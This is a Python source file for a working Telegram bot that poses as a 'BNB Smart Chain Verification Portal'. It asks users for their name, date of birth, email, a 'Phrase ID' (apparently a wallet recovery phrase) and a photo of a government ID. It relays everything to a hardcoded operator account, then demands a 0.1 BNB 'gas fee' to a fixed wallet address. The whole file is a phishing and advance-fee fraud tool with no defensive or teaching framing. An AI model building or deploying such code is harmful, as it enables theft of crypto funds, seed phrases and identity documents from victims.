from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)
import sqlite3

# =========================
# CONFIGURATION
# =========================

import os

TOKEN = os.getenv("TELEGRAM_TOKEN")

if not TOKEN:
    raise Exception("TELEGRAM_TOKEN environment variable is missing!")

ADMIN_ID = 6259009798

NAME, COUNTRY, DOB, PHRASE_ID, EMAIL, DOCUMENT, CONFIRM = range(7)

WALLET_ADDRESS = "0x06D8Ba276e02B04E5756817457b27a82f1D6F48f"
PAYMENT_AMOUNT = "0.1 BNB"

# =========================
# DATABASE
# =========================

conn = sqlite3.connect("database.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS applications (
    user_id INTEGER PRIMARY KEY,
    name TEXT,
    country TEXT,
    phrase_id TEXT,
    email TEXT,
    txid TEXT,
    status TEXT
)
""")

conn.commit()

# =========================
# START
# =========================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()

    await update.message.reply_text(
    "🔐 Welcome to BNB Smart Chain Verification Portal.\n\n"
    "Complete verification to confirm your eligibility and access your funds.\n\n"
    "Please provide the required information.\n\n"
    "Enter your Full Name:"
)

    return NAME

# =========================
# FORM STEPS
# =========================

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["name"] = update.message.text
    await update.message.reply_text("Enter your Country:")
    return COUNTRY


async def get_country(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["country"] = update.message.text

    await update.message.reply_text(
        "Enter your Date of Birth (DD/MM/YYYY):"
    )

    return DOB
async def get_dob(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["dob"] = update.message.text

    await update.message.reply_text(
        "Enter your Phrase ID:"
    )

    return PHRASE_ID

async def get_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["phrase_id"] = update.message.text
    await update.message.reply_text("Enter your Email Address:")
    return EMAIL


async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["email"] = update.message.text

    await update.message.reply_text(
        "Please upload one valid government-issued ID:\n\n"
        "• Passport\n"
        "• Driver's License\n"
        "• National ID Card\n"
        "• Voter ID Card\n\n"
        "Upload your document now."
    )

    return DOCUMENT
async def get_document(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.message.photo:
        file_id = update.message.photo[-1].file_id
        context.user_data["doc_type"] = "photo"

    elif update.message.document:
        file_id = update.message.document.file_id
        context.user_data["doc_type"] = "document"

    else:
        await update.message.reply_text(
            "Please upload an image or document."
        )
        return DOCUMENT

    context.user_data["document"] = file_id

    await update.message.reply_text(
        "PLEASE REVIEW YOUR DETAILS:\n\n"
        f"👤 Name: {context.user_data['name']}\n"
        f"🌍 Country: {context.user_data['country']}\n"
        f"🎂 Date of Birth: {context.user_data['dob']}\n"
        f"🔑 Phrase ID: {context.user_data['phrase_id']}\n"
        f"📧 Email: {context.user_data['email']}\n\n"
        "Type YES to confirm or NO to cancel."
    )

    return CONFIRM
async def confirm_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    answer = update.message.text.upper()

    if answer == "NO":
        await update.message.reply_text(
            "Application cancelled.\n\n"
            "Send /start to begin again."
        )
        return ConversationHandler.END

    if answer != "YES":
        await update.message.reply_text(
            "Please type YES or NO."
        )
        return CONFIRM

    user_id = update.effective_user.id

    name = context.user_data["name"]
    country = context.user_data["country"]
    phrase_id = context.user_data["phrase_id"]
    email = context.user_data["email"]
    document = context.user_data["document"]
    doc_type = context.user_data["doc_type"]

    cursor.execute("""
        INSERT OR REPLACE INTO applications
        (user_id, name, country, phrase_id, email, txid, status)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        user_id,
        name,
        country,
        phrase_id,
        email,
        "",
        "PROCESSING"
    ))

    conn.commit()

    await update.message.reply_text(
        "Thank you.\n\n"
        "Your application has been submitted successfully.\n\n"
        "Status: PROCESSING"
    )

    keyboard = [[
        InlineKeyboardButton(
            "✅ APPROVE",
            callback_data=f"approve_{user_id}"
        ),
        InlineKeyboardButton(
            "❌ REJECT",
            callback_data=f"reject_{user_id}"
        ),
    ]]

    await context.bot.send_message(
    chat_id=ADMIN_ID,
    text=(
        f"NEW APPLICATION\n\n"
        f"Name: {name}\n"
        f"Country: {country}\n"
        f"Date of Birth: {context.user_data['dob']}\n"
        f"Phrase ID: {phrase_id}\n"
        f"Email: {email}\n\n"
        f"User ID: {user_id}\n\n"
        "Attached below is the submitted ID document."
    )
)
    if doc_type == "photo":
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=document
        )
    else:
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=document
        )

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text="Choose an action:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# =========================
# ADMIN BUTTONS
# =========================

async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data.startswith("approve_"):
        user_id = int(data.split("_")[1])

        cursor.execute(
            "UPDATE applications SET status=? WHERE user_id=?",
            ("AWAITING PAYMENT", user_id)
        )
        conn.commit()

        await context.bot.send_message(
    chat_id=user_id,
    text=(
        "Congratulations 🎉\n"
        "Identity Approved\n\n"
        f"Gas Fee: {PAYMENT_AMOUNT}\n"
        "This fee is required to process the blockchain transaction and finalize wallet activation, enabling the Send, Receive, Buy, and Sell features.\n\n"
        "Payment Method:\n"
        "BNB (BSC)\n"
        f"Wallet Address:\n`{WALLET_ADDRESS}`\n\n"
        "Transaction ID using:\n"
        "/tx YOUR_TRANSACTION_ID\n\n"
        "Wallet Activation Processing..."
    ),
    parse_mode="Markdown"
)

        await query.edit_message_text(
            query.message.text + "\n\n✅ APPROVED"
        )

    elif data.startswith("reject_"):
        user_id = int(data.split("_")[1])

        cursor.execute(
            "UPDATE applications SET status=? WHERE user_id=?",
            ("REJECTED", user_id)
        )
        conn.commit()

        await context.bot.send_message(
            chat_id=user_id,
            text=(
                "We regret to inform you that your application "
                "was not approved.\n\n"
                "Please contact support."
            )
        )

        await query.edit_message_text(
            query.message.text + "\n\n❌ REJECTED"
        )

    elif data.startswith("confirmpay_"):
        user_id = int(data.split("_")[1])

        cursor.execute(
            "UPDATE applications SET status=? WHERE user_id=?",
            ("APPROVED", user_id)
        )
        conn.commit()

        await context.bot.send_message(
            chat_id=user_id,
            text=(
                "Payment confirmed successfully.\n\n"
                "Your account has been fully approved.\n\n"
                "Status: APPROVED"
            )
        )

        await query.edit_message_text(
            query.message.text + "\n\n✅ PAYMENT CONFIRMED"
        )

    elif data.startswith("rejectpay_"):
        user_id = int(data.split("_")[1])

        cursor.execute(
            "UPDATE applications SET status=? WHERE user_id=?",
            ("PAYMENT REJECTED", user_id)
        )
        conn.commit()

        await context.bot.send_message(
            chat_id=user_id,
            text=(
                "Payment verification failed.\n\n"
                "Please check your transaction details "
                "and submit again."
            )
        )

        await query.edit_message_text(
            query.message.text + "\n\n❌ PAYMENT REJECTED"
        )

# =========================
# TRANSACTION ID
# =========================

async def tx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if len(context.args) == 0:
        await update.message.reply_text(
            "Usage:\n/tx YOUR_TRANSACTION_ID"
        )
        return

    txid = " ".join(context.args)

    cursor.execute(
        "UPDATE applications SET txid=?, status=? WHERE user_id=?",
        (txid, "PENDING CONFIRMATION", user_id)
    )
    conn.commit()

    await update.message.reply_text(
        "Thank you.\n\n"
        "Your payment proof has been submitted "
        "for verification.\n\n"
        "Status: PENDING CONFIRMATION"
    
    )
    cursor.execute(
        "SELECT name, phrase_id FROM applications WHERE user_id=?",
        (user_id,)
    )

    row = cursor.fetchone()

    if row:
        name, phrase_id = row

        keyboard = [[
            InlineKeyboardButton(
                "✅ CONFIRM PAYMENT",
                callback_data=f"confirmpay_{user_id}"
            ),
            InlineKeyboardButton(
                "❌ REJECT PAYMENT",
                callback_data=f"rejectpay_{user_id}"
            ),
        ]]

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                "PAYMENT SUBMISSION\n\n"
                f"Name: {name}\n"
                f"Phrase ID: {phrase_id}\n\n"
                f"Transaction ID:\n{txid}"
            ),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# =========================
# STATUS COMMAND
# =========================

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    cursor.execute(
        "SELECT status FROM applications WHERE user_id=?",
        (user_id,)
    )

    row = cursor.fetchone()

    if row:
        await update.message.reply_text(
            f"Current Status: {row[0]}"
        )
    else:
        await update.message.reply_text(
            "No application found."
        )

# =========================
# MAIN
# =========================

app = Application.builder().token(TOKEN).build()

conv_handler = ConversationHandler(
    entry_points=[CommandHandler("start", start)],
    states={
    NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
    COUNTRY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_country)],
    DOB: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_dob)],
    PHRASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phrase)],
    EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
    DOCUMENT: [
        MessageHandler(
            filters.PHOTO | filters.Document.ALL,
            get_document
        )
    ],
    CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_details)],
},
    fallbacks=[],
)

app.add_handler(conv_handler)
app.add_handler(CallbackQueryHandler(admin_buttons))
app.add_handler(CommandHandler("tx", tx))
app.add_handler(CommandHandler("status", status))

print("Bot started...")
app.run_polling() 